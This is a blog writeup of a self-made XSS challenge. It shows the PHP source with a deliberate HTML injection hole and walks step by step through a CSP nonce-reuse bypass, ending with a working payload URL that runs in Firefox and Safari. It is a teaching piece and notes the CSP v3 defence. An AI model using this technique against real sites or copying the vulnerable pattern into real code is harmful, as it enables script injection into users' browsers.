> :Title shadow=0 0 8px black, color=white
>
> My first XSS challenge - Writeup

> :Author name=Alain, date=14/09/2020

<br>

# The challenge

Two weeks ago I created [my first XSS challenge](https://twitter.com/krial057/status/1300423121351184384). A XSS challenge is similar to a [CTF challenge](https://ctftime.org/ctf-wtf/). Whereas CTF challenges usually consist of complete Websites without a clear goal, a XSS challenge is usually short and the goal is to execute arbitrary Javascript code.

The main obstacle of my XSS challenge consisted of bypassing the [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

## Source Code
The challenge source code was public, so no hidden secrets to find. The following is a shortened version of the challenge source code:
```php | index.php
<?php 
  $nonce = base64_encode(random_bytes(32));
  header("Content-Security-Policy: default-src 'none'; script-src 'nonce-".$nonce."'"); // --> Only allow script execution with the right nonce token
?>
<html>
    <body>
        <?php
            $todos = '';
            $todos = $todos."<div> Todo #1 </div>\n"; // --> A constant TODO
            $todos = $todos."<div> Todo #2 </div>\n"; // --> A constant TODO
            $todos = $todos."<div> ".$_GET['todo']." </div>\n"; // --> A TODO supplied by the user over url
            $todo_list = explode("\n", $todos);
            foreach($todo_list as $todo) {
                if(strpos($todo, "script") === false) { // --> Don't allow script injections in todos
                    echo $todo."\n";
                } 
            }
        ?>

        <script nonce="<?php echo $nonce ?>">
                console.log("bla")
        </script>
    </body>
</html>
```

# The solution

## Baby steps

The first thing one should notice is the possibilty to inject arbitrary html using the todo parameter:
```php
$todos = $todos."<div> ".$_GET['todo']." </div>\n"; // --> arbitrary HTML injection using ?todo=own_html
```
People not knowing about [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) probably think they could simply provide a `script` element with arbitrary JS. The script tag filter `if(strpos($todo, "script") === false)` could easily be bypassed using `SCRIPT` instead of `script`. However, giving it a try we get the following error in the console:
```js | index.php?todo=<SCRIPT>alert(1)</SCRIPT>
/*~*/ Refused to execute inline script because it violates /*~*/
/*~*/ the following Content Security Policy directive: /*~*/
/*~*/ "script-src 'nonce-FHFXLGv/SdLkQ9CjBaE8s5wiMR3W1yADF+BjNZE+ZNs='". /*~*/
/*~*/ Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), /*~*/
/*~*/ or a nonce ('nonce-...') is required to enable inline execution. /*~*/
```

The only possible way to to execute arbitrary javascript is to add a `nonce` attribute to the `script` tag that is the same as the one defined in the CSP header. As the nonce is randomly generated on each page refresh, it is impossible to set it in advance.

## Getting the nonce

So the big question is: how can we add a script tag with a valid nonce before we know the nonce?
Most common techniques are:
* Exfiltrate the nonce somehow and reuse it
* Force the same nonce using a cached version of the site
* Overwrite the base tag

However, all of these were not possible on my challenge. `default-src` was set to `none`, making nonce exfiltration pretty much impossible. Page caching was disabled and there was no script tag with a relative url, that could have been abused by the base tag.

The main idea was to somehow reuse the same nonce that is already used by the included script. Let's see what would happen if we open a script tag without closing it in front of another script tag:

```html
/*+*/ <script <script nonce="randomlyGeneratedNonce">
     console.log("bla")
</script>
```

Interestingly, the original `<script` is now considered to be an attribute of our newly injected open script tag.
Even better, we can inject our own attributes inside the script tag that has the correct nonce:

```html
/*+*/ <script id="yolo" <script nonce="randomlyGeneratedNonce">
    console.log("bla")
</script>
```

The next big question is, what happens if we provide a `src` attribute. Will it execute the script provided in the `src` attribute or will it run, as before, the content (`console.log`) of the `<script>` element? Let's try it out in Firefox:

```html
/*+*/ <script src="data:,alert(1)" <script nonce="randomlyGeneratedNonce"> /* --> src could also be a URL to a js file and it would also work */
    console.log("bla")
</script>
```
This HTML snippet will actually result in an alert popping up and showing nothing in the console. So `src`has a higher priority than the actual script element content.

Perfect, let's try to pop an alert with my challenge:

```
https://not.lu/challenge?todo=%3cSCRIPT%20src=data:,alert(1)
```

But nothing happens. Let's inspect the DOM tree:
```html
<SCRIPT src="data:,alert(1)" </div>
    <script nonce="I7ZgzXJRSbrjz5vwVlPSEOGzDxBZVOjPOVJ6WQJkoWU=">
      console.log("test")
</script>
```

The problem is, the todo we add is encapsulated inside a div element:
```php
$todos = $todos."<div> ".$_GET['todo']." </div>\n";
```
and the `>` of the ending div tag is closing our script tag before the nonce is reached.

However I sneaked a way inside the challenge to remove the ending div tag. Do you remember the filter that removes the `script` tags?
It not only removes the script tag but the whole line in which the script tag is inside:

```php
foreach($todo_list as $todo) {
    if(strpos($todo, "script") === false) { // --> If "script" is contained inside the line, don't echo the whole line.
        echo $todo."\n";
    } 
}
```
by providing a todo with the following content: `<SCRIPT src="data:,alert(1)" \n script`, we can remove the unwanted closing div tag:

```html
<SCRIPT src="data:,alert(1)" 
/*-*/ script </div> // --> This line will be removed as it contains "script"
    <script nonce="I7ZgzXJRSbrjz5vwVlPSEOGzDxBZVOjPOVJ6WQJkoWU=">
      console.log("test")
</script>
```


## The final solution

[Doesn't work in Chrome:](#why-it-doesnt-work-in-chrome--csp-v3)

```
https://not.lu/challenge?todo=%3cSCRIPT%20src=data:,alert(1)%0ascript
```

# Why it doesn't work in Chrome / CSP v3

At first I was very confuset why it wasn't working in Chrome. Chrome was throwing an error that the nonce was incorrect. However, the nonce attribute was set and was correct.(`console.log(script.nonce)` was the same as the nonce set in the CSP header).

It was [@SecurityMB](https://twitter.com/SecurityMB) who pointed me to the following CSP v3 spec: [Nonceable Algorithm](https://www.w3.org/TR/CSP3/#is-element-nonceable). The problem of abusing an already existing script tag's nonce is apprently known and this new spec prevents the mechanic . It does this by chechking for the strings `<script` or `<style` inside a script element's attribute names and values. If it is present it renders the nonce invalid.

Firefox and Safari don't implement this spec yet. Therefore, this mechanic could still be abused in my challenge.
